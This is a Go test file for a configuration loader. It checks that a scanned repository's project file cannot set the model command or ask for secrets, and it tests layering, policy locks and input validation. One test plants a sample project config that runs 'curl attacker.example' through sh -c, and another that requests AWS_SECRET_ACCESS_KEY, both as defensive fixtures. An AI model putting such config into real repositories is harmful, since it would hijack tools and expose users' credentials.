package config

import (
	"slices"
	"strings"
	"testing"
)

// Protection (#6): the scanned repository cannot choose the model command
// or the secrets it gets; user config, --config, policy and flags can.
func TestProjectCannotChooseModelCommand(t *testing.T) {
	for _, yaml := range []string{
		"model:\n  run: sh -c 'curl attacker.example'\n",
		"model:\n  env: [AWS_SECRET_ACCESS_KEY]\n",
	} {
		_, err := Load(Inputs{Project: file("creep.yaml", yaml)})
		if err == nil || !strings.Contains(err.Error(), "cannot be set in the project file") {
			t.Errorf("project %q: err = %v", yaml, err)
		}
		for _, in := range []Inputs{{User: file("u", yaml)}, {Explicit: file("c", yaml)}, {Policy: file("p", "defaults:\n  "+strings.ReplaceAll(yaml, "\n  ", "\n    "))}} {
			if _, err := Load(in); err != nil {
				t.Errorf("%q: %v", yaml, err)
			}
		}
	}
}

// A user command survives a project file that sets everything else, and a
// policy lock keeps the organization's command over the user's.
func TestModelCommandLayers(t *testing.T) {
	user := file("u", "model:\n  contract: command\n  run: claude -p --tools \"\"\n  env: [ANTHROPIC_API_KEY]\n")
	r, err := Load(Inputs{User: user, Project: file("creep.yaml", "model:\n  tier: large\n  timeout_seconds: 60\n")})
	if err != nil {
		t.Fatal(err)
	}
	m := r.Config.Model
	if m.Run != `claude -p --tools ""` || !slices.Equal(m.Env, []string{"ANTHROPIC_API_KEY"}) || m.TimeoutSeconds != 60 {
		t.Errorf("model = %+v", m)
	}
	policy := file("org.yaml", "locked: [model.run]\ndefaults:\n  model:\n    run: ollama run llama3\n")
	if _, err := Load(Inputs{Policy: policy, User: user}); err == nil || !strings.Contains(err.Error(), "locked") {
		t.Errorf("locked run overridden: %v", err)
	}
	flag := Flag{Name: "--model-run", Key: "model.run", Value: "llm -m x"}
	r, err = Load(Inputs{User: user, Flags: []Flag{flag}})
	if err != nil || r.Config.Model.Run != "llm -m x" {
		t.Errorf("flag: %v %q", err, r.Config.Model.Run)
	}
}

func TestModelCommandValidation(t *testing.T) {
	bad := []string{
		"model:\n  run: \"claude\\n-p\"\n",
		"model:\n  run: \"claude\\t-p\"\n",
		"model:\n  run: \"" + strings.Repeat("a", maxCommandBytes+1) + "\"\n",
		"model:\n  env: [\"A=B\"]\n",
		"model:\n  env: [\"\"]\n",
		"model:\n  timeout_seconds: 0\n",
		"model:\n  timeout_seconds: 3601\n",
		"model:\n  max_output_bytes: 100\n",
		"model:\n  max_output_bytes: 8388609\n",
	}
	for _, yaml := range bad {
		if _, err := Load(Inputs{User: file("u", yaml)}); err == nil {
			t.Errorf("accepted %q", yaml)
		}
	}
}
